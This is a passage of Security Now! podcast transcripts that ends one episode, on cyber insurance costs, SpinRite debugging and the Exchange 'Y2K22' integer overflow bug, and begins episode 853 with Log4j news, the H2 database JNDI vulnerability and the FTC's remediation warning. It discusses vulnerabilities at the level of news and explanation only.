STEVE:  That's an add-on.  What about password managers?  Will DuckDuckGo's browser support the industry's emerging standard browser plugin add-on facility?  If not, can a feature-stripped desktop browser succeed in today's world?  I couldn't use one.  So it'll be interesting to see what they have in mind, how they think they're going to be able to, I mean, frankly, I would have started with Chromium.  I would have done another fork of Chromium.  And yes, then stripped it of privacy intrusion stuff, you know, wrapped a shell around it that prevented it from doing all of that.  But still I just don't know, well, we'll see how they can deliver on what they want to.  It will be interesting.



The cost of cyber insurance will likely be rising, or maybe insurance will even be terminated.  Given the past several years, and the number of times we've talked about state and local government agencies, including school districts, relying upon their cyberattack insurance to cover the cost of ransoms and after-attack recovery, it shouldn't surprise anyone that Wall Street investors and the insurance markets are worried about the cybersecurity risks that state and local governments face.  This is changing the economics of public sector services, and not for the better.



Offices that previously provided a limited set of local services, which never really gave much more than a passing thought to the need for cybersecurity, are now for the first time finding themselves targeted by foreign criminal and nation-state actors.  And in reaction to all the payouts insurers have had to cough up, the rates on cybersecurity insurance, which has been the main line of defense for many state and local governments, has started to rise and, in some cases, to even become unavailable, at least not at a price that our government agencies have been able to afford or just had the budget for.



We know from all of our previous reporting that the bad guys are explicitly targeting entities which are believed to be well insured because, as with Willie Sutton, that's where the real money is.  As far as protecting themselves goes, for our local budget-strapped municipal and state agencies, as always, it's a matter of funding.



Omid Rahmani, who's the Associate Director for U.S. Public Finance at the credit rating agency Fitch, which is a biggie, told The Record in an interview:  "The landscape is changing quite rapidly now from the cybersecurity insurance and the threat landscape side, which leaves local governments in the middle dealing with issues they traditionally haven't had to deal with."  And literally no one believes that our agencies are up to the challenge they now have no choice but to tackle.



Last month, HilltopSecurities surveyed 150 municipal bond credit analysts and specialists, excluding those who were at rating agencies.  I've placed the bar chart showing the sad results of one of the survey questions which they were asked.  The 13th multiple choice survey question asked was:  "What is your opinion of how prepared state and local governments and other municipal market participants currently are for cyber attacks?"  So this was multiple choice:  Very Prepared, Prepared, On Their Way to Being Prepared, Somewhat Prepared, Hardly Prepared, or Other.



Okay.  By far the dominant bar, at 63% of the total, was Hardly Prepared.  The runner-up, which made up most of the remaining balance at 30%, was Somewhat Prepared.  And the remaining 6% selected from the multiple choices was the optimistic On Their Way to Being Prepared.  But no one, not one of the 150 analysts surveyed, chose either they're Prepared or Very Prepared.  And many of the surveyed analysts cited cybersecurity as a major factor in the current municipal bond market.  So what does that translate into?  Higher borrowing cost for all of those who finance themselves by issuing municipal bonds.  And of course it's we taxpayers who fund these bond measures.



Back in April of 2020, only 12% of those responding to a similar survey cited cybersecurity among the top five issues affecting the municipal bond market at the time.  In this updated and just published survey, that number has risen from 12% to 29%.  And of course this is why none of this bodes well for the future availability and/or the cost to these agencies for the purchase of sufficiently comprehensive cyberattack insurance.  We keep seeing that money isn't spent where there isn't a screaming need for it to be spent.  And this appears to be especially true in IT, which the starched-shirt C-Suite executives have never really understood, nor really wanted to need to understand.  You know, their feeling was please just let all that confusing mumbo-jumbo be somebody else's problem.  It's not.



Until recently, random municipal agencies were not being attacked.  There was no reason to attack them.  So not only was their true cyber-preparedness allowed to go lacking, but their insurance costs were low.  However, that's not what the future promises.  At least insurance is something that bureaucrats understand.  What this means for those of us in the U.S., at least, is either a decrease in the quality or quantity of provided services due to the need to budget more on a fixed budget for cyber insurance, or probably an increase in local taxes since, as I said, somebody needs to pay for this, and taxes is where the money comes from.  So, yeah.  There's a lag in this happening.  As we know, the ransom attacks have been increasingly prevalent the last few years.  It's getting pushed down the chain, and ultimately it will end up raising our taxes.



So, Leo, two weeks ago I mentioned that I was excited because the day after that podcast "The Matrix Resurrections"...



LEO:  Oh, god.



STEVE:  Oh.



LEO:  Hope lives eternal in the Matrix fan; doesn't it.



STEVE:  Oh, it does.  Twenty-three years ago "The Matrix" first appeared.



LEO:  Amazing.  Amazing.



STEVE:  And I admit to having, oh, my god, I admit to, I mean, that was amazing.



LEO:  Oh, yeah.  Oh, yeah.



STEVE:  And, you know, I'm sure that after spending these past 17 years together our audience knows that for me, hope does indeed spring eternal.  But in this case those hopes were unrealized, and the movie was shown to be a barren money play offering not a single new idea.  Immediately after suffering through it, I tweeted:  "The Matrix Resurrections.  I'm unsurprised that IMDb's viewer rating has dropped it from 6.8 to 6.1 after its wide release.  I was unimpressed by the seemingly endless and boring kung fu.  The whole rationale was quite a reach.  If you feel that you need to see it, don't expect much."  And for today, I just checked.  The Internet Movie Database now pegs it at 5.7, which is not surprising.  So anyway, I think that probably killed it.



LEO:  "The Matrix" was such a breakthrough at its time.  And if you were lucky enough, and I was, to have seen it without any prior knowledge, I just went to see it, and it was like I walked out of that theater mind blown.



STEVE:  Yes.



LEO:  But now it's so well known, it'd be hard to have that kind of impact with a Matrix movie again, I think.



STEVE:  Yeah.  I do agree.  I will say, however, Leo, over the holidays Lorrie and I did encounter one very pleasant surprise, Netflix's "Don't Look Up."



LEO:  Oh, isn't that fun?  Yeah.



STEVE:  Oh, it was...



LEO:  Yeah, I enjoyed it.



STEVE:  Yeah, I'm glad.  I meant to shoot you and Lisa a note.  It's a wonderfully exaggerated, yet disturbingly apropos, brilliant commentary on the many facets of creeping denialism that we appear to be seeing around us everywhere these days.  It was, you know, I thought it was brilliant.  And so I do recommend it to anybody who has access.  I'm glad you guys liked it, too.



LEO:  Oh, yeah, yeah.



STEVE:  On the SpinRite front, I've become very comfortable with the project's use of GitLab, and I am very glad I took the time to bring it online.  The SpinRite development community is using it to manage the collection of known problems that I'm whittling away at every day.  And I was using GRC's newsgroups, like I think I have something in OneNote, well, I know that I have some notes in OneNote that are now living over publicly in GitLab.  So I was sort of privately managing the stuff I needed to deal with and get to.  And I was often marking messages as unread in the newsgroups as my own means of managing.  But, oh, this is just such a cool way to operate.



And the good news is it continues to be true that the new foundation I've written for SpinRite is working robustly for just about everyone.  At the same time I strongly believe it's worthwhile to take the time right now to track down the causes of any misbehavior that anyone finds.  For one thing, I need to know that it's not my fault, no matter how rare it might be.  Sometimes what we're finding is the trouble is a bug in a chipset that is in no way SpinRite's fault, but I don't know that until I find it.



We found an example of that on an old ASRock motherboard.  SpinRite is now using many of the features that every chipset was advertising back then, but had apparently not yet perfected.  So in those cases there's nothing I can do.  In this case it only occurred when the chipset was in AHCI mode.  So switching the motherboard back to its legacy ATA mode, which by the way was the BIOS's default mode for that motherboard anyway, it resolved the problem.  And even when the motherboard was in AHCI mode, the trouble only appeared to occur the second or third time SpinRite was run after booting.



LEO:  Oh, I hate that kind of bug.



STEVE:  It's weird.



LEO:  Oh, god.



STEVE:  You know?  So it probably wouldn't even be encountered, and it requires non-default settings to happen.  And if it were to happen, there's a workaround which is not running SpinRite more than once, or just switching back to ATA mode, which was the default.  And Leo, this thing, when I found it, it's like, what?  It's like I was setting a bit in very, very high memory, an AHCI register bit.  All of the I/O stuff lives at the top of the 4GB memory area.  That's where all the PCI stuff is.  And so all the addresses start off as FFFE and then something or other.



So there was a point where I was setting a bit, OR'ing a bit on, the least significant bit, of a word up there.  And that caused a word in low memory to spontaneously switch to 0101 hex.  It's like, what?  I mean, it's, I mean, like a bug, right, in the hardware.  If you don't have hardware to run on, you don't have a computer, really.  You've got a fancy random number generator that's not very good, but still.  Anyway, the point is there are those sorts of problems.



But an example of a different kind, over just this past weekend, I tracked down some really odd behavior that was only ever seen on a particular Supermicro server motherboard with a Xeon processor.  It turns out that some Intel processors stop running their timestamp counter, which is supposed to be counting up the processor clock cycles, they stop it while the processor is halted.  Okay.  So servicing a hardware interrupt from a halted state can theoretically reduce a system's interrupt response time, since there's no need to wait for a current instruction to be completed, because there's no current instruction being executed.  The system's halted.



So at one point in my code I was establishing a timebase reference.  I wanted to measure the duration between two hardware interrupts, the slow timer ticking.  So I was halting the processor before each of the two successive clock interrupts in order to obtain the most jitter-free reading of that interval.  Now, remember, no one else had any trouble.  We have hundreds, truly, hundreds of people testing the code that I'm writing, and often each of them are testing on multiple systems.  Yet this was only seen on that one system.  I acquired one of them because that's the only way to solve this kind of problem.



Okay.  Today I'm no longer halting the processor during that timebase establishment.  The problem's gone.  It wasn't really necessary to do that, that is, what I was originally doing, since today's processors run so fast relative to the 55ms interval I was measuring.  But, you know, I'm a perfectionist.  So now SpinRite runs on that system perfectly, and on untold others that would eventually have encountered SpinRite in the future and would have had the same problem.  Now they won't.  And as I was saying earlier, I realize this is a different approach to developing software.  But everyone here understands that I'm not just creating software to get it shipped.  I'm creating it to get it right.  And that's how I have my jollies on the holiday weekend.  Prepare for some fun.



LEO:  Uh-oh.



STEVE:  We all know that 2021 was a rough year for Microsoft's Exchange Server.



LEO:  Oh, boy, yeah.



STEVE:  And unfortunately 2022 hasn't, so far, started out much better.  Or as Ars Technica's headline read:  "Microsoft fixes harebrained Y2K22 Exchange bug that disrupted email worldwide.  A rookie programming error crashed servers because they couldn't process the year 2022."



LEO:  Oh, god.



STEVE:  Yeah.  But Leo, the details are just wonderful.  Which is why this made it into the show's title piece.  Okay.  So a global mass disruption in Exchange Server 2016 and 2019 email delivery was the result of a date check failure which made it impossible for Microsoft's servers to accommodate the year 2022.  And this immediately prompted the industry to label this bug Y2K22.



Okay.  So get a load of this.  This is what was happening and lurking inside Microsoft's servers.  Exchange stores dates and times - and this is actually for the security update timestamp on Exchange security packages - stores dates and times as a 32-bit signed integer.  The largest binary value that a 32-bit unsigned integer that is just like 32 bits can hold, we all know, that's 2^32-1 because we start counting at 0; right?  So it's 2^32 total values.  And since we said 0 counts as one of those, the highest value is 2^32-1.  And we all know what that number is; right?  That's that 4.3 billion because that's 32 bits, the same as the address on an IPv4 packet.  So it's like 4.3 billion IPv4 Internet addresses, right, and so on.  And anything 32 bits, 4.3 billion.



But signed integers, that is, where that 32 bits needs to express a plus or minus, a set of negative values, which are represented in a format typically known as "2's complement" arithmetic, they use the most significant bit as their sign bit.  And it turns out all kinds of cool things happen when you do that.  For example, if you have a value of all zeroes, and you increment it in a binary fashion, it goes 00001, 00010, 00011, 00100 and so forth upwards.  Well, if you decrement it in that same binary sense, it goes from all zeroes, if you subtract one from that, it's all ones.  So in other words, -1 is all ones.



And notice that the first bit, the most significant bit, the leftmost bit, is now a 1.  So as you continue to subtract ones from that, the least significant bits have that zero pattern that dances around, while everything else stays all ones, until you get to the most negative value that a signed 32-bit value can represent, which is a one followed by all zeroes.



Okay.  So that's the way values are represented in our compilers when we say we have a signed 32-bit value.  Okay.  So if the largest value that unsigned 32 bits can represent is 4.3 billion, the largest positive value that a signed 32-bit quantity can represent is 2^31-1.  Right?  Not 2^32-1 because we lose that high bit.  That's now the signed bit.  So the largest positive value is 2^31-1.  And that's going to be half of 4.3 billion.  Well, it turns out it's exactly 21 474 836 47.  In other words, 2147483647.  Notice that the first two digits are 21, as in 2021.  It turns out that Microsoft uses the first two digits of the decimalized update's version, which is a signed 32-bit value, to denote the year the update was released; and that that version value is stored, as I said, as a 32-bit signed value. 



Well, that approach has a limitation that Microsoft just encountered, since the largest value you can start a 32-bit signed integer with is 21.  You cannot start a 32-bit signed integer with 22 followed by eight digits.  It won't fit.  Consequently, when Microsoft released, as they did, version 2201010001 on New Year's Eve, everyone's on-premises Exchange servers immediately crashed because they were unable to figure out what the heck was going on.  The crashes meant that Exchange was unable to process messages, which became stuck in transport queues.  And admins around the world on New Year's Day were frantically trying to troubleshoot the problem, hopefully not with a hangover from over-partying the night before.



LEO:  Why are they being so clever?  Does this even - this is just dumb.



STEVE:  It is so dumb, Leo.  It's like, what?



LEO:  They're so, oh, let's be clever.



STEVE:  Uh-huh.  You're right.  It is.  It is.  Okay.  That troubleshooting was not aided by the cryptic log messages that Exchange was emitting.  It was like the description was, on one of them, was "The FIP-FS 'Microsoft' Scan Engine failed to load."  Now, the error description had a detail which, if you knew what was going on, would have been a clue because it said "Can't convert 2201010001 to long."  Meaning that it was trying to do a type conversion from an unsigned 32 to a long value, you know, 64 bits, but it couldn't do it.  It was crashing.



LEO:  When you look at the date of this error message and that error message, it should have rung a bell; right?  I mean...



STEVE:  Yeah, yeah.



LEO:  You know?  It seems like, oh, that's interesting.  I'm seeing a lot of 22s in there.



STEVE:  Now, had Microsoft's clever programmer decided to use an unsigned 32-bit integer, we could have gone until 2044.



LEO:  But the same thing would have happened then.



STEVE:  Yes, it would.  Yes, it would.



LEO:  Maybe just use a long.  How about that?



STEVE:  We could have gone until 2024 until this meltdown occurred.  Now, as a programmer, the only reason I can see to encode the year, month, and day followed by a four-digit serial number like this is that a simple arithmetic comparison could have been used to compare versions, which must be what's going on.  But it would have been far safer to reduce the serial number portion to just three digits from four, and then use three digits for the year, since three digits for the release number on any given day, that is, those lower three digits, would certainly have been sufficient.



LEO:  There's a million ways you could have done this better.  I mean...



STEVE:  Yes.  That's true.



LEO:  Whoever did it was being too clever and not thinking about the consequences.



STEVE:  Yes.  And of course Exchange Server has been around for a long time.



LEO:  No, but this is, you know, this is a very common error.



STEVE:  I know.  It's bad.



LEO:  Yeah.  Using the wrong type to represent a number, and then you get these overflows, that happens all the time.  It's just a...



STEVE:  Yes.  Yes.  It should have been a, what, a 10-digit string.  



LEO:  Or just use a long or something.  There's a million ways you could do it.



STEVE:  Yup.



LEO:  That's just too clever.



STEVE:  And that's how programmers get in trouble, right, by going, ooh, I'm going to flex my muscles.



LEO:  Aren't I clever.  You know what's really clever?  The fix.  Oh, my god.



STEVE:  In any event, it was immediately fixed, and the world received its email only a little bit late.  And how did Microsoft fix this so quickly, when as we know most things Microsoft does take months, or sometimes even years?  Well, they punted.  Microsoft released a PowerShell-based script called Reset-ScanEngineVersion.ps1, which needed to be run on each Exchange mailbox server used for downloading antimalware updates.  And what does the little PowerShell script do?  It adjusts the date back to 21 12 33 0001.  Yes, that's right.  In Redmond, New Years has been delayed - and December has 33 days.



LEO:  Well, by now 35.  I mean, they're going to keep doing this?  I mean, can it ever be 2022 ever again?



STEVE:  Get a load of this.  I'm sure they came up with this kludgy hack on top of a kludge because it has the benefit of not breaking their simple, signed arithmetic version comparisons.  They need to do nothing more than hold the year's digits at 21.  And after all, December can last for another 66 days until we get to December 99th, at which point it might be necessary to move to the 13th month of 2021.  Which I suppose would mean that Microsoft had invented the Leap Century.



Now, okay.  To put everyone's mind at ease, Microsoft wrote:  "The newly updated scanning engine is fully supported by Microsoft.  While we need to work on this sequence longer term, the scanning engine version was not rolled back," Leo.  "Rather" - they wrote this, I'm not kidding, I'm quoting them - "it was rolled forward into this new sequence."  That's right.  We didn't roll it back.  We just rolled it forward in a different direction.



LEO:  Back to the future.  Of course.



STEVE:  They finished by writing:  "The scanning engine will continue to receive updates in this new sequence."



LEO:  No.  They're going to fix this.



STEVE:  Yes.



LEO:  No.



STEVE:  They said that.  They said that.



LEO:  No.



STEVE:  "The scanning engine will continue to receive updates in this new sequence."  So for who knows how long, they're going to leave it starting at 21 and - because, I mean, they've got lots of months.  You've got 99 months, and you've got 99 days in a month.  So, yeah.  We're just going to abandon actual dates because our actual dates are broken.



LEO:  Now I can't wait to see the simple PowerShell calculation they'll have to do to figure out if this is the latest version.  Suddenly that simple calculation gets very complicated.  Oh, boy.  That's hysterical.  That's hysterical.  So they could go, I mean, for years.



STEVE:  Yeah.



LEO:  99 months of 99 days.  I don't know what that is, but...



STEVE:  They just abandon their comparison.  I mean, if I were them, the easiest thing to do would be just to redefine it as unsigned.  Then nothing else has to change.  Just change the type to unsigned.  Then it won't break their comparison.  It won't break their conversion to long any longer.  And what I would, I mean, that's clearly the simplest thing to do, if they want to maintain for another 22 years until 2044, when this will break again.  And that, you know, that ought to be time for Microsoft to figure out the right way to do it.



LEO:  Start over and rewrite the whole thing.  Oh, programmers are so fun.  We don't even, I mean, I suppose we'll never know who wrote that code.  Just incredible.



STEVE:  No.  I mean, he's probably cashed out.  Or he got, I mean, Exchange has been around for so long that it was written back then.  And I'm sure he had stock in Microsoft and, you know...



LEO:  You're right.  He's probably rich and living on an island.



STEVE:  Yeah.  He's laughing right now.  It's like, "Yeah,  you finally got hit by my - you got hit by my time bomb that I left behind."



LEO:  You know, that's true because if he had written it and was still at Microsoft, he probably would have known that this is going to be a problem in 2022.  Maybe not.  He must have known that.



STEVE:  Oh, Leo.  This is the kind of stuff a programmer forgets the next day.  I mean, really.



LEO:  Again, take notes, folks.  Write things down.  That is just a wild story.  Is that really the fix?



STEVE:  The problem is he would have, in C, it would have been, depending upon the size of the language, it would have been just a signed variable, and he...



LEO:  It's true, he may not have known that it was a 32-bit integer.  He should have.  You should know that about your language.



STEVE:  You have to.  That's why I'm in assembly language, because nothing is hidden.



LEO:  Yeah, yeah, yeah.  I mean, integer overflow is so common.  It's such a common issue.  It came up at the Advent of Code this month, where people realized they had to use a long because there were...



STEVE:  Well, Leo, who's ever heard of a buffer overflow?



LEO:  That never happened.



STEVE:  How could that happen?



LEO:  It never happens.  Welcome to March 675th in the year 2021.  Well, this could, I mean, by redoing your numbering scheme, Steve, maybe we can find a way to create a PowerShell script to do that.



STEVE:  Oh, that's right.  Who am I laughing at?  I've got a three-digit...



LEO:  You've got an overflow coming up, yeah.



STEVE:  That's right.  Oh, what goes around, comes around.



LEO:  But you have a plan, at least.  You remembered, and you have a plan.



STEVE:  We have been watching this day creep forward slowly.  We have three years to go.



LEO:  Three years to go.  So, yeah, I should really figure out what that - as I remember, I did it once, and I think it was January 2024, I think?  But, I mean, sorry, December 2024.  Roughly three years.  But we won't think about that right now.  Right now we'll just be glad that Steve Gibson graces us every Tuesday with Security Now!.  We do this about 1:30 Pacific, 4:30 Eastern, 21:30 UTC.  If you want to watch the sausage being made, we stream it all at live.twit.tv.  You can chat at irc.twit.tv or in the Club TWiT Discord server as we do the show.



After the fact, Steve's got several versions of the show that are unique.  He's got the 16Kb audio for the bandwidth-impaired.  He's got the 64Kb audio, just like we do.  He also has transcripts which are very, very handy, searchable transcripts.  All of that at GRC.com.  That's his home on the web, the Gibson Research Corporation.  You can leave feedback for him there at GRC.com/feedback.  You should also investigate all of the other wonderful things.  I mean, if you've got a Tesla, and you haven't run ShieldsUp! yet, how do you know you're secure?  I mean, come on.  That's there.  That's a free service.



And of course his bread and butter, the world's best mass storage maintenance and recovery utility, SpinRite, is also there, v6.0 available for sale.  If you buy it now, you'll get 6.1 for free as an upgrade, and you can participate in the development of the next version.  All of that at GRC.com.  He's also on the Twitter, and his DMs are open so you can message him there, @SGgrc.



We have 64Kb audio and video, that's our unique version of the show, at our website, TWiT.tv/sn.  There is a YouTube channel devoted to Security Now!, as well.  And of course probably the best way to get any podcast is subscribe, and that way you get it automatically.  You don't have to think about it.  Audio or video, just go to your favorite podcast player and subscribe to Security Now!.  You'll get it automatically.  And if they let you leave a review, please tell the world about this very, very valuable show, the show everybody must listen to weekly, by giving it a five-star rating.  We would really appreciate that.



Steve, have a great week.  I hope you find something to watch on the tube.



STEVE:  We're having a good time.



LEO:  Good.



STEVE:  And we will be back next week, where it actually is January of 2022, even though it's December in Redmond.



LEO:  That would have been another good title.  Maybe we'll save that for tomorrow's Windows Weekly.



STEVE:  "It's December in Redmond?"



LEO:  "December in Redmond."  Thank you, Steve.  Have a great week.  We'll see you next time on Security Now!.



STEVE:  Thank you, buddy.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#853

DATE:		January 11, 2022

TITLE:		URL Parsing Vulnerabilities

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-853.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we'll begin with another in our series of Log4j updates which includes among a few other bits of news, an instance of a real-world vulnerability, and the FTC's somewhat surprising and aggressive message.  We'll chronicle the Chrome browser's first largish update of 2022 and also note the gratifying 2021 growth of the privacy-centric Brave browser. WordPress needs updating, but this time not an add-on but WordPress itself.  We're going to then answer the age-old question posed during last Wednesday's Windows Weekly podcast: "What exactly is a Pluton, and how many can dance on the head of a pin?"



And finally, after a quick sci-fi reading recommendation and a very brief touch on my ongoing SpinRite work, we're going to take a gratifyingly deep dive into the unfortunate vagaries of our industry's URL parsing libraries to see just how much trouble we're in as a result of no two of them parsing URLs in exactly the same way.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  He's going to explain/answer Paul Thurrott's question, what exactly is a Pluton?  We'll talk about success for the Brave browser, more Log4j vulnerabilities, and then a very interesting deep dive into the problems with URL parsing and why so many programs get it wrong.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 853, recorded Tuesday, January 11th, 2022:  URL Parsing Vulnerabilities.



It's time for Security Now!, the show where we cover the latest news from the world of security, thanks to our professional security analyst Steve Gibson of GRC.com.  He's right here.  I  like the eyebrows.



STEVE GIBSON:  If I were to nod and synchronize my eyebrows, they could stay motionless while my head moved.  I'll have to work on that.



LEO:  And there you see on display Steve's amazing analytic abilities.  It's just how he thinks, ladies and gentlemen.  Well, hi, Steve.	



STEVE:  Yo.



LEO:  Yo.  Let's get going here.



STEVE:  Yo.



LEO:  Yes.



STEVE:  Well, so it's 011122.



LEO:  Yes.



STEVE:  Security Now! 853.  A team of four researchers, security researchers in the northeast, Massachusetts and New York, I think, took it upon themselves to look at another aspect of our libraries that we're all using and discovered some really, really interesting problems which are right now affecting everyone.  And anyway, so a really interesting topic, I think, one of our deep dives.  Those who do not have the advantage of show notes in front of them are going to have to - I was going to say close your eyes, but not if you're commuting.  But if you're being commuted, then that would be good.



LEO:  The governor will call any minute now, I'm sure.



STEVE:  Then you'll have to picture some of these.  But I'll be gentle.  Anyway, I think a really interesting topic of URL parsing vulnerabilities.  But this week we're going to begin with another in our series of Log4j updates, which includes among a few other bits of news an instance of a real-world vulnerability that has popped up and the FTC's, the U.S. Federal Trade Commission's somewhat surprising and aggressive message relative to Log4j.



We'll chronicle the Chrome browser's first largest update of 2022 and also note the gratifying 2021 growth of the privacy-centric Brave browser.  WordPress needs updating, but this time not one of those pesky add-ons, but WordPress itself.  We're going to then answer the age-old question posed during last Wednesday's Windows Weekly podcast:  What exactly is a Pluton, and how many can dance on the head of a pin?



And finally, after a quick sci-fi reading recommendation and a very brief touch on my ongoing SpinRite work, we're going to take, as I said, a gratifying deep dive into the unfortunate vagaries of our industry's URL parsing libraries to see just how much trouble we're in as a result of no two of them parsing URLs in exactly the same way.



LEO:  Interesting, fascinating, might I say engaging content, as always, coming up on Security Now!.  And I will, for those of you watching video, I'll display the images.  But you'll just, the rest of you, use your imaginations.  And then where do people get the show notes, actually?  I should - because people may want to after the fact see them.  You have them on your website; yes?



STEVE:  Oh, yeah, GRC.com/securitynow and they're already posted.  I did that this morning.



LEO:  Good, good. 



STEVE:  So the link is there.



LEO:  Let's get that Picture of the Week.  You ready?



STEVE:  Ah, well, this is another one of those oldies but goodies.  Well, not really old because it's 2021.  But they never get tired.  Someone tweeted this to me, Dave Hart.  He said:  "Thought you'd enjoy this screen at OR Tambo Airport in Johannesburg, South Africa."



LEO:  Oh, wow.



STEVE:  And of course this is - and I love it because it says "2021 Year of Security Culture" it's boasting about.  And it's got all kinds of extra logos and bureaucratic mumbo-jumbo.  And right in the middle of the whole thing, otherwise very impressive presentation, is a blue box, says "Your Windows license will expire soon."



LEO:  Whoops.



STEVE:  It's like, okay, what?



LEO:  Whoops.



STEVE:  So they're running an unlicensed version of Windows, or what?



LEO:  That's secure, sure. 



STEVE:  I wasn't aware that Windows licenses expired.  I mean, I've never had a license expire.  Is that some...  



LEO:  No, yeah, yeah, yeah, this is what you get if you first install Windows without giving it an authentication code.



STEVE:  Ah, right, right, right.



LEO:  You can run it for 30, 60, or 90 days.  But eventually it says oh, no, you've got to - now you've got to enter your - you've got to activate.



STEVE:  Yeah.  Year of security culture, not so much.



LEO:  Whoopsies.



STEVE:  So anyway, yeah.



LEO:  Well, we got it on the Internet.  We thought it would work for forever.  It must...



STEVE:  If only there was a - it says "Go to Settings."  If only you could press the Settings button.  But no.



LEO:  No, it's in kiosk mode.



STEVE:  I don't think that's going to happen.  So anyway.  Just another fun little bit of flotsam.



LEO:  Awesome.



STEVE:  Okay.  Our Log4j update.  The U.S. CISA has stated that the Log4Shell exploit of the Log4j vulnerability has not resulted in "significant" government intrusions yet.  CISA said:  "We're not seeing confirmed compromises of federal agencies, including critical infrastructure.  We are seeing widespread scanning by malicious actors.  We're seeing some prevalence of what we would call low-level activities like installation of cryptomining malware, but we're not seeing destructive attacks or attacks attributed to advanced persistent threats."  So it's like, okay, don't relax, everybody, but so far it's not the end of the world.



Eric Goldstein, who's the CISA's Executive Assistant Director for Cybersecurity, said that there would be a "long tail remediation" because of how widespread the issue is.  And of course that's what we've predicted, too, because of this problem of the Java library inheritance tree.  He said CISA estimates that hundreds of millions of devices are impacted.  Easterly said - oh, Easterly, that's somebody else - anyway, that CISA is aware of reports of attacks affecting foreign government agencies, including the Belgian Defense Ministry - and I did pass over a story about that - as well as reports from cybersecurity firms that nation-state adversaries are developing attacks using Log4Shell, but said CISA cannot independently confirm those reports at this time.  So stay tuned.



The overall security group posture is that there's scanning being done and implanting occurring, like a race to get systems' networks penetrated.  The exploitation of those penetrations is on a backburner because everyone knows sooner or later those vulnerabilities that are creating the openings are going to close.  So it's frightening because it means the bad guys are, like, acting in a smart fashion, in a means to optimize their long-term benefit for short-term forestalling the glory for just getting into systems.  So anyway, I think we're going to have an interesting 2022.



Meanwhile, Matt Keller, the vice president of Federal Services at GuidePoint Security, told Threatpost that many agencies are unable to patch the problems arising from Log4j due to network-connected end-of-life and end-of-service systems.  In other words, mission-critical systems that are still in service, but which cannot be updated because they've passed out of their maintenance life.  There aren't going to be updates coming from them, like, oh, yes, you've got Windows 7?  Too bad.



Anyway, Matt said that federal agencies are relying upon command-line scripts to locate affected systems.  They're also constructing tiger teams as a means of tearing into the massive workload that has resulted, tiger teams being specialized cross-functional teams brought together specifically to solve or investigate one particular problem or critical issue.  Between technology issues which may prove to be intransigent, travel restrictions, and shipping delays involved in replacing these systems, Keller predicts that agencies are months away from being able to address Log4j, despite the fact that the CISA said, "No Christmas for you until we've got this fixed.  You're not going to go home.  You're just going to stay here."  Well, everybody left.  And so it's going to still be a few months before things calm down.



An example of a specific and unfortunately typical Log4j-based vulnerability has been found in a popular open source Java-based, of course, database engine library.  That Maven Java repository which Google had plumbed and we talked about before, indicates that this popular, it's called the "H2 database engine," is being used by 6,807 individual, what they describe as "artifacts," meaning, you know, up-tree dependencies, or dependents, rather.  We've talked about the tree of dependencies that one gets when libraries are built from libraries which are built from libraries and so on.



In this case, this HS database appears somewhere underneath those 6,807 different high-level Java "things."  And since this is an embedded database engine, where you typically don't even see it, right, it's just like your thing, like, has a database that comes from somewhere.  Well, this is where it comes from.  But you never really see the H2 embed.  So it might not even be clear to those using it that accessible Log4j vulnerabilities are buried underneath there.  This particular issue being tracked is CVE-2021-42392 and has been described as "the first critical issue published since Log4Shell, on a component other than Log4j, that exploits the same root cause of the Log4Shell vulnerability, namely that JNDI remote class loading."



Shachar Menashe, the senior director of JFrog security research, said:  "Similar to the Log4Shell vulnerability uncovered in early December, attacker-controlled URLs that propagate into JNDI lookups can allow unauthenticated remote code execution, giving attackers sole control over the operation of another person or organization's systems."  So basically that's what we know of as the Log4j problem in a nutshell.  He added that:  "The H2 database is used by many third-party frameworks including Spring Boot, Play Framework, and JHipster.  While this vulnerability is not as widespread as Log4Shell, it can still have a dramatic impact on developers and production systems if not addressed."  So, yeah, 6,807 of them.



The flaw affects H2 database versions 1.1.100, so that sounds like almost at the start, up through 2.0.204.  And it's been addressed in .206, which was first made available last Wednesday, January 5th.  And I should note that the JFrog folks, who I was unaware had their eye on this, we'd run across them a couple times before relative to Java stuff.  They've got a terrific page of Log4j and Log4Shell resources, including a remediation cookbook, free scanning tools to see if you've got the problem, and what they call a "survival guide."



I have a link to their page in the show notes, but you can just put "JFrog" into any search engine and click, after you go to their page, click the banner link that they've got at the top of the homepage, and that'll take you to their very comprehensive Log4j/Log4Shell resources.  Yeah, it's right there at the top, Leo.  Yeah, yeah.  Is it that little black bar?  Yeah, there it is.  Yup, and there you are at the resource page.  So definitely a useful resource for any of our listeners or their friends who are part of that month-long remediation battle for getting this thing under control.



Okay, now, this sort of surprised me.  A week ago, on the 4th of January, while we were doing this podcast, the U.S. Federal Trade Commission posted a blog warning, essentially warning companies to remediate the Log4j security vulnerability.  The blog's title, their own, the FTC's own blog title is:  "FTC warns companies to remediate Log4j security vulnerability."  And in its posting it directly threatens companies with legal action, likening it to the Equifax negligence.  So here's what the FTC posted.



They said:  "Log4j is a ubiquitous piece of software used to record activities in a wide range of systems found in consumer-facing products and services."  You know, that's the FTC's charter.  They said:  "Recently, a serious vulnerability in the popular Java logging package, Log4j" - and then they cite the CVE 44228 - "was disclosed, posing a severe risk to millions of consumer products to enterprise software and web applications. This vulnerability is being widely exploited by a growing set of attackers."



They said:  "When vulnerabilities are discovered and exploited, it risks a loss or breach of personal information, financial loss, and other irreversible harms.  The duty to take reasonable steps to mitigate known software vulnerabilities implicates laws including, among others, the Federal Trade Commission Act and the Gramm Leach Bliley Act.  It is crucial that companies and their vendors relying on Log4j act now in order to reduce the likelihood of harm to consumers, and to avoid FTC legal action."



